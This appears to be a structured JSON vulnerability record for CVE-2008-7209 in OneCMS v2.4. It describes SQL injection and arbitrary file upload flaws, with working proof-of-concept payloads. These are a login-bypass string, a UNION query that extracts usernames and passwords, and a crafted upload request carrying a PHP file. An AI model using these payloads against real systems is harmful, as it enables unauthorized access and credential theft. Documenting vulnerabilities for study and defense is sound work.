```
{
  "vulnerability_details": [
    {
      "cve_id": "CVE-2008-7209",
      "root_cause": "The application is vulnerable to SQL injection due to insufficient input sanitization in the `a_login.php` and `staff.php` scripts.",
      "weaknesses": [
        "SQL Injection: The application uses unsanitized user-controlled input in SQL queries, specifically in the `username` field during login and in the `user` parameter in the `staff.php` script. This allows an attacker to inject malicious SQL code.",
       "Insufficient Input Sanitization: The application attempts to sanitize input using `strip_tags` and `stripcslashes`, but these are insufficient to prevent SQL injection attacks.",
        "Authentication Bypass: Successful SQL injection in the login script bypasses authentication allowing attackers to gain administrative access.",
        "Information Disclosure: Successful SQL injection in staff.php allows attackers to retrieve sensitive data from database tables."
      ],
       "impact": "An attacker can bypass the login authentication and gain administrative access to the application. Also, it allows attackers to retrieve sensitive information like username and password.",
      "attack_vector": "The attack can be performed remotely by sending a specially crafted HTTP request to the vulnerable pages (`a_login.php` and `staff.php`) with malicious SQL code in the `username` parameter in the login form and in the `user` parameter in the `staff.php` URL.",
      "attacker_capabilities": "The attacker needs to be able to send HTTP requests to the vulnerable application. No specific position or privilege is needed other than that.",
      "poc": [
        "Username: admin' or 1=1 /*",
        "http://localhost/OneCMS_v2.4/staff.php?user=aaa' union select 1,username,password,1,1,1,1,1,1,1,1,1,1 from onecms_users/*"
      ]
    },
    {
        "cve_id": "CVE-2008-7209",
        "root_cause": "The application has an arbitrary file upload vulnerability due to insufficient file type validation in the `a_upload.php` script.",
       "weaknesses": [
          "Arbitrary File Upload: The application only checks the `Content-Type` of the uploaded file and does not properly validate file extensions. This allows an attacker to upload arbitrary files by crafting an image/gif file with malicious content.",
          "Insufficient File Validation: The application uses a weak check for file types which can be easily bypassed by sending a file with the correct `Content-Type` header."
        ],
       "impact": "An attacker can upload arbitrary files, such as PHP scripts, and execute them on the server, potentially leading to complete compromise of the application and the server.",
        "attack_vector": "The attack can be performed remotely by sending a crafted POST request to the `a_upload.php` script with a malicious file disguised as an image/gif. Authentication bypass is also needed to access the vulnerable page.",
        "attacker_capabilities":"The attacker needs to be able to send HTTP requests to the vulnerable application and the capability to bypass the login form using SQL Injection vulnerability.",
        "poc": "POST /OneCMS_v2.4/a_upload.php?view=add2 HTTP/1.0\nCookie: username=admin'or 1=1/*; password=96e79218965eb72c92a549dd5a330112; login_date=1199693273; style=Trend\n\n-----------------------------7d84115025c\nContent-Disposition: form-data; name=\"ss_1\"; filename=\"C:\\path\\to\\file\\test.php\"\nContent-Type: image/gif\n\n<?\nphpinfo();\n?>\n-----------------------------7d84115025c\nContent-Disposition: form-data; name=\"ss2_1\"\n\n-----------------------------7d84115025c\nContent-Disposition: form-data; name=\"type_1\"\n\nimage\n-----------------------------7d84115025c\nContent-Disposition: form-data; name=\"muche\"\n\n1\n-----------------------------7d84115025c\nContent-Disposition: form-data; name=\"Submit\"\n\nUpload\n-----------------------------7d84115025c--"
    }
  ]
}
```